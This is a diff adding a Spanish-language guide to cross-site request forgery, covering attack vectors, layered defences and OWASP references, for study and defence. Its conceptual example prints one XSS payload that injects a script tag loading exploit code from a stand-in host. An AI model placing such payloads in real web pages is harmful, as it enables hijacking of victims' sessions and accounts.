@@ -1,0 +1,67 @@
+# Falsificación de solicitudes entre sitios (CSRF)
+
+## Descripción
+CSRF (Cross-Site Request Forgery, falsificación de solicitudes entre sitios) es un tipo de ataque en el que un atacante induce a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web en la que el usuario está actualmente autenticado. Estas acciones se realizan aprovechando la sesión o credenciales de la víctima (por ejemplo, cookies de sesión).
+
+CSRF puede combinarse con vulnerabilidades como XSS para entregar cargas útiles que ejecuten peticiones en nombre de la víctima, permitiendo al atacante cambiar contraseñas, transferir fondos, modificar configuraciones, etc.
+
+---
+
+## Ejemplo de ataque (conceptual)
+Un atacante puede insertar en una página vulnerable un fragmento HTML/JS que cargue un archivo remoto con la lógica maliciosa:
+
+```html
+"><script src=//www.example.com/exploit.js></script>
+```
+
+`exploit.js` podría contener código que, usando la sesión activa de la víctima, envíe peticiones para cambiar la contraseña o realizar otra acción privilegiada. Para que esto funcione, el atacante debe conocer (o descubrir) cómo la aplicación realiza esa acción (endpoint, parámetros, método HTTP, etc.).
+
+---
+
+## Vectores comunes
+- Formularios auto-enviados (POST) desde un dominio externo.
+- Peticiones `GET` manipuladas con parámetros en la URL (si el servidor trata cambios por GET — mala práctica).
+- Carga remota de scripts que ejecutan `fetch`/`XMLHttpRequest` con credenciales de la víctima.
+- Imágenes, iframes o tags que provoquen solicitudes hacia endpoints vulnerables.
+
+---
+
+## Prevención (mejores prácticas)
+Para mitigar CSRF se recomiendan varias defensas en capas:
+
+### 1. Tokens Anti-CSRF
+- Generar un token único por sesión (o por formulario) y requerir su envío con cada petición que modifique estado (POST/PUT/DELETE).
+- Validar el token en el servidor.
+
+### 2. Cabeceras y CORS
+- No confiar en el origen por defecto. Configurar CORS estrictamente y solo permitir orígenes de confianza para endpoints que aceptan solicitudes de origen cruzado.
+- Requerir cabeceras específicas (por ejemplo, `X-Requested-With`) y validar su presencia si procede.
+
+### 3. SameSite en cookies
+- Marcar cookies de autenticación con `SameSite=Lax` o `SameSite=Strict` para evitar que el navegador envíe cookies en solicitudes de terceros (reduce riesgo de CSRF clásico).
+- Para casos donde `SameSite=None` es necesario (p. ej. integraciones cross-site), combinar con otras defensas como tokens CSRF.
+
+### 4. Re-autenticación para acciones sensibles
+- Solicitar contraseña o factor adicional antes de operaciones críticas (cambio de contraseña, transferencia de fondos, gestión de usuarios).
+
+### 5. Validación y saneamiento
+- Aunque CSRF explota la confianza del estado de sesión, mantener validaciones robustas en servidor evita que acciones no previstas se ejecuten sin la autorización correcta.
+
+### 6. Evitar cambios de estado con GET
+- Diseñar la aplicación para que solo métodos no seguros provoquen cambios (usar POST/PUT/DELETE) y validar CSRF sobre ellos.
+
+### 7. WAF y monitoreo
+- Usar un WAF como capa adicional para detectar patrones anómalos.
+- Monitorear y registrar acciones críticas para detección temprana.
+
+---
+
+## Notas sobre XSS y su relación con CSRF
+- XSS puede anular las defensas anti-CSRF si permite al atacante leer tokens CSRF o ejecutar peticiones desde la consola del navegador de la víctima. Por ello, evitar XSS es complementario y crítico.
+- Las defensas deben considerarse en conjunto: prevenir XSS, aplicar tokens CSRF, y usar `SameSite` y re-autenticación.
+
+---
+
+## Recursos útiles
+- OWASP CSRF Cheat Sheet: https://owasp.org/www-community/attacks/csrf
+- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
